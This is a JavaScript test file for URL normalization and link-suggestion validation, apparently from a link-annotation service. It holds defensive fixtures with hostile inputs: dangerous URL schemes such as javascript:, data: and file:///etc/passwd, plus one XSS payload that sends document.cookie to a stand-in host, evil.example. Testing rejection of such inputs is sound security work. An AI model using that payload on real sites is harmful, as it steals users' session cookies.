import { test } from 'node:test';
import assert from 'node:assert/strict';
import { normalizeUrl, normalizeLink, validateSuggestion } from '../src/validate.js';

test('normalizeUrl treats equivalent page URLs as one key', () => {
  const canonical = 'https://example.com/article';
  assert.equal(normalizeUrl('https://example.com/article#section-2'), canonical);
  assert.equal(normalizeUrl('https://EXAMPLE.com/article'), canonical);
  assert.equal(normalizeUrl('https://example.com:443/article'), canonical);
  assert.equal(normalizeUrl('https://example.com/article?utm_source=x&utm_medium=y'), canonical);
  assert.equal(normalizeUrl('https://example.com/article?fbclid=abc'), canonical);
});

test('normalizeUrl drops the trailing slash only on bare origins', () => {
  assert.equal(normalizeUrl('https://example.com/'), 'https://example.com');
  assert.equal(normalizeUrl('https://example.com'), 'https://example.com');
  // A trailing slash on a path can be meaningful, so it is preserved.
  assert.equal(normalizeUrl('https://example.com/docs/'), 'https://example.com/docs/');
});

test('normalizeUrl keeps meaningful query params and orders them stably', () => {
  assert.equal(
    normalizeUrl('https://youtube.com/watch?v=abc123'),
    'https://youtube.com/watch?v=abc123'
  );
  assert.equal(
    normalizeUrl('https://example.com/s?b=2&a=1'),
    normalizeUrl('https://example.com/s?a=1&b=2')
  );
});

test('normalizeUrl rejects non-page and hostile URLs', () => {
  for (const bad of [
    'chrome://settings',
    'file:///etc/passwd',
    'about:blank',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'https://user:pass@example.com/page',
    'not a url',
    '',
    null,
    undefined,
    42,
  ]) {
    assert.equal(normalizeUrl(bad), null, `should reject ${String(bad)}`);
  }
});

test('normalizeUrl rejects URLs past the length cap', () => {
  assert.equal(normalizeUrl(`https://example.com/${'a'.repeat(3000)}`), null);
});

test('normalizeLink blocks every scheme that could execute', () => {
  for (const bad of [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'blob:https://example.com/uuid',
    'file:///etc/passwd',
    'vbscript:msgbox(1)',
    'chrome-extension://abc/page.html',
  ]) {
    assert.equal(normalizeLink(bad), null, `should reject ${bad}`);
  }
});

test('normalizeLink accepts bare hostnames the way an address bar does', () => {
  assert.equal(normalizeLink('example.com/page'), 'https://example.com/page');
  assert.equal(normalizeLink('  https://example.com/page  '), 'https://example.com/page');
  assert.equal(normalizeLink('http://example.com'), 'http://example.com/');
});

test('normalizeLink requires something that looks like a host', () => {
  assert.equal(normalizeLink('localhost'), null);
  assert.equal(normalizeLink('just some words'), null);
  assert.equal(normalizeLink(''), null);
  assert.equal(normalizeLink('   '), null);
});

const validBody = () => ({
  source_url: 'https://example.com/article',
  suggested_link: 'https://other.example/related',
  highlighted_text: 'the Greenwich meridian',
  description: 'Background on how the meridian was chosen.',
  prefix: 'passage before ',
  suffix: ' passage after',
});

test('validateSuggestion accepts a well formed submission', () => {
  const result = validateSuggestion(validBody());
  assert.equal(result.ok, true);
  assert.equal(result.value.source_url, 'https://example.com/article');
  assert.equal(result.value.highlighted_text, 'the Greenwich meridian');
});

test('validateSuggestion requires every core field', () => {
  for (const field of ['source_url', 'suggested_link', 'highlighted_text', 'description']) {
    const body = validBody();
    delete body[field];
    const result = validateSuggestion(body);
    assert.equal(result.ok, false, `${field} should be required`);
    assert.match(result.error, new RegExp(field.split('_')[0], 'i'));
  }
});

test('validateSuggestion rejects a javascript: payload in the suggested link', () => {
  const body = validBody();
  body.suggested_link = 'javascript:fetch("https://evil.example?c="+document.cookie)';
  const result = validateSuggestion(body);
  assert.equal(result.ok, false);
});

test('validateSuggestion enforces length caps', () => {
  const body = validBody();
  body.description = 'x'.repeat(1001);
  assert.equal(validateSuggestion(body).ok, false);

  const body2 = validBody();
  body2.highlighted_text = 'x'.repeat(1001);
  assert.equal(validateSuggestion(body2).ok, false);
});

test('validateSuggestion strips control characters and collapses whitespace', () => {
  const body = validBody();
  body.description = 'line one\n\tline two   spaced';
  const result = validateSuggestion(body);
  assert.equal(result.ok, true);
  assert.equal(result.value.description, 'line one line two spaced');
});

test('validateSuggestion truncates anchor context to the cap', () => {
  const body = validBody();
  body.prefix = 'p'.repeat(500);
  body.suffix = 's'.repeat(500);
  const result = validateSuggestion(body);
  assert.equal(result.ok, true);
  assert.equal(result.value.prefix.length, 200);
  assert.equal(result.value.suffix.length, 200);
});

test('validateSuggestion tolerates missing optional context', () => {
  const body = validBody();
  delete body.prefix;
  delete body.suffix;
  const result = validateSuggestion(body);
  assert.equal(result.ok, true);
  assert.equal(result.value.prefix, '');
  assert.equal(result.value.suffix, '');
});

test('validateSuggestion rejects non-object bodies', () => {
  for (const bad of [null, undefined, 'string', 42, true]) {
    assert.equal(validateSuggestion(bad).ok, false);
  }
});

test('validateSuggestion preserves whitespace at the inner edges of context', () => {
  const body = validBody();
  body.prefix = 'words before the quote ';
  body.suffix = ' words after the quote';
  const result = validateSuggestion(body);
  assert.equal(result.ok, true);
  // The adjacent space is the signal that distinguishes two occurrences of the
  // same phrase on a page. Trimming it here would silently break anchoring.
  assert.equal(result.value.prefix.endsWith(' '), true, 'prefix must keep its trailing space');
  assert.equal(result.value.suffix.startsWith(' '), true, 'suffix must keep its leading space');
});

test('validateSuggestion keeps the context edge nearest the quote when truncating', () => {
  const body = validBody();
  body.prefix = `${'x'.repeat(400)}NEAR `;
  body.suffix = ` NEAR${'y'.repeat(400)}`;
  const result = validateSuggestion(body);
  assert.equal(result.ok, true);
  assert.equal(result.value.prefix.endsWith('NEAR '), true, 'prefix keeps its tail');
  assert.equal(result.value.suffix.startsWith(' NEAR'), true, 'suffix keeps its head');
});
